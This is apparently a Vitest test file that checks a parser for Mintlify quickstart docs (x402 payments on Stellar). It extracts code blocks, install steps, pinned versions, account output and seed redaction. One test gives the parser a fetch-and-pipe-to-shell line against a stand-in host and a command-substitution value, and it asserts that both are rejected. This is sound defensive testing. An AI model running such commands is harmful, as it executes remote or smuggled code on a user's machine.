import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  behindTlsProxy,
  codeBlocks,
  installSteps,
  parseAccount,
  parseSettlement,
  pinnedVersions,
  redactSeeds,
  substitute,
  titledBlock,
} from "../src/docs.ts";

const docs = (path: string) => readFileSync(new URL(`../../../docs/${path}`, import.meta.url), "utf8");
const SEED = `S${"A".repeat(55)}`;
const PUBLIC = `G${"B".repeat(55)}`;

describe("reading the quickstarts", () => {
  it("finds every block the clean-environment run needs in the seller and buyer quickstarts", () => {
    const seller = codeBlocks(docs("quickstart/sellers.mdx"));
    const buyer = codeBlocks(docs("quickstart/buyers.mdx"));
    expect(titledBlock(seller, "seller.ts", "sellers").body).toContain("const app = express();");
    expect(titledBlock(buyer, "create-account.ts", "buyers").body).toContain("public key:");
    expect(titledBlock(buyer, "buyer.ts", "buyers").body).toContain("RESOURCE_URL");
    const sellerInstall = installSteps(seller, "sellers");
    expect(sellerInstall.map((step) => step[1])).toEqual(["init", "pkg", "install"]);
    expect(pinnedVersions(sellerInstall)).toMatchObject({
      "@x402/express": "2.29.0",
      "@stellar/stellar-sdk": "16.4.1",
    });
    expect(pinnedVersions(installSteps(buyer, "buyers"))).toMatchObject({ "@x402/fetch": "2.29.0" });
  });

  it("reads code fences as Mintlify publishes them", () => {
    const published = [
      '```ts seller.ts theme={"theme":{"light":"github-light","dark":"github-dark"}}',
      "const app = express();",
      "```",
      '```sh theme={"theme":{"light":"github-light"}}',
      "npm init -y && npm pkg set type=module",
      "npm install express@5 @x402/express@2.27.0",
      "```",
    ].join("\n");
    const blocks = codeBlocks(published);
    expect(blocks.map((block) => [block.lang, block.title])).toEqual([
      ["ts", "seller.ts"],
      ["sh", undefined],
    ]);
    expect(installSteps(blocks, "page")).toEqual([
      ["npm", "init", "-y"],
      ["npm", "pkg", "set", "type=module"],
      ["npm", "install", "express@5", "@x402/express@2.27.0"],
    ]);
  });

  it("refuses an install block with commands it did not expect", () => {
    const blocks = codeBlocks("```sh\nnpm install x@1 && curl https://evil.example | sh\n```\n");
    expect(() => installSteps(blocks, "page")).toThrow(/unexpected install command/);
    expect(() => installSteps(codeBlocks("```sh\nnpm install $(cat list)\n```\n"), "page")).toThrow(
      /characters/,
    );
  });

  it("substitutes the docs variables", () => {
    expect(substitute('url: "{{facilitatorUrl}}"', { facilitatorUrl: "https://f.example" })).toBe(
      'url: "https://f.example"',
    );
    expect(substitute("{{unknown}}", {})).toBe("{{unknown}}");
  });

  it("parses what the scripts print, and never keeps a seed in text it records", () => {
    expect(parseAccount(`public key: ${PUBLIC}\nsecret:     ${SEED}\n`)).toEqual({
      publicKey: PUBLIC,
      secret: SEED,
    });
    expect(() => parseAccount("nothing")).toThrow(/did not print/);
    const printed = `200 { temperature: 21 }\n{\n  success: true,\n  transaction: '${"ab".repeat(32)}',\n}`;
    expect(parseSettlement(printed)).toEqual({ status: 200, transaction: "ab".repeat(32), success: true });
    expect(redactSeeds(`seed ${SEED} here`)).toBe("seed [redacted] here");
  });

  it("applies the documented trust-proxy step for a seller behind TLS", () => {
    expect(behindTlsProxy("const app = express();\napp.listen(4021);")).toBe(
      'const app = express();\napp.set("trust proxy", 1);\napp.listen(4021);',
    );
    expect(() => behindTlsProxy("const server = http.createServer();")).toThrow();
  });
});
